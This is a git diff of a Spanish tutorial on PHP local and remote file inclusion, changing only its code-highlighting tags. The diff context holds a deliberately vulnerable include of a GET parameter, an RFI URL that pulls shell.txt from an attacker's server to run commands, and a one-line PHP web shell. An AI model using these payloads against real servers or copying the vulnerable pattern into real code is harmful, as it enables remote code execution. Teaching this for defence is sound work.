@@ -15,7 +15,8 @@ Para poder corroborar si un sitio es vulnerable, se puede colocar un valor ilóg
 En nuestro ejemplo tenemos: "http://localhost/index.php?page=" donde se coloca un valor, en este caso http://localhost/index.php?page=78se3, algo aleatorio que no se encuentre registrado.
 Si arroja un error como Warning: main()… o Warning: include()… o similar entonces es probable que sea vulnerable a RFI o LFI
 
-{% LFI Codigo Vulnerable por Detras %}
+~ Archivo vulnerable de php mediante LFI ~ 
+{% highlight php %}
 <?php
 include $_GET[‘pagina’];
 ?>
@@ -31,7 +32,7 @@ El atacante (Nosotros) podriamos obtener una Shell en el servidor vulnerable med
 http://[servidor_victima]/index.php?page=http://[servidor_atacante]/shell.txt&&cmd=ls
 
 Pudiendo contener el archivo shell.txt cualquier código, por ejemplo:
-{% Codigo Malicioso %} 
+{% highlight php %} 
 <?php
   system($cmd);
 ?>
